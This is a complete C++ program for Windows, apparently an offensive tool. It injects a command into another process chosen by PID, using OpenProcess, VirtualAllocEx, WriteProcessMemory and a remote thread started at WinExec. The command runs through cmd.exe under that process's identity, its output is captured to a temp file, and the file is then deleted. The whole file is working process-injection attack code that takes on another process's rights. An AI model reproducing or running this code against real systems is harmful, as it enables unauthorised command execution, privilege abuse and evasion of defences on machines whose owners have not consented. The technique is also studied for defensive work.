#include <windows.h>
#include <iostream>

int main(int argc, char** argv) {

	if (argc < 3) {
		printf("Usage: %s PID COMMAND\n", argv[0]);
		return -1;
	}

	// Grab PID and command from command line arguments
	char* pid_c = argv[1];
	DWORD PID_TO_IMPERSONATE = atoi(pid_c);

	// Step 1: Open the target process with full access rights.
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID_TO_IMPERSONATE);
	if (hProcess == NULL)
	{
		std::cout << "[-] Failed Open Process, error:  " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return 1;
	}

	// Step 2: Allocate memory in the target process.
	LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteMem == NULL)
	{
		CloseHandle(hProcess);
		return 1;
	}

	// Step 3: Write the payload (command) into the allocated memory in the target process.
	const char* payload = "C:\\windows\\system32\\cmd.exe /c ";
	char command[MAX_PATH];
	sprintf_s(command, sizeof(command), "%s %s > C:\\Windows\\Temp\\output.txt 2>&1", payload, argv[2]);
	if (!WriteProcessMemory(hProcess, remoteMem, command, strlen(command) + 1, NULL))
	{
		CloseHandle(hProcess);
		return 1;
	}

	// Step 4: Create a remote thread in the target process to execute the payload.
	LPTHREAD_START_ROUTINE pThreadProc = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WinExec"));
	if (pThreadProc == NULL)
	{
		return 1;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, remoteMem, 0, NULL);
	if (hThread == NULL)
	{
		CloseHandle(hProcess);
		return 1;
	}
	else {
		WaitForSingleObject(hThread, INFINITE);
	}

	if (remoteMem != NULL)
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);

	// All operations are completed, close handles.
	if (hProcess != NULL)
		CloseHandle(hProcess);

	Sleep(3000);

	// Display the output of the executed command and then delete the temporary file.
	system("type C:\\Windows\\Temp\\output.txt");
	system("del C:\\Windows\\Temp\\output.txt");

	return 0;
}
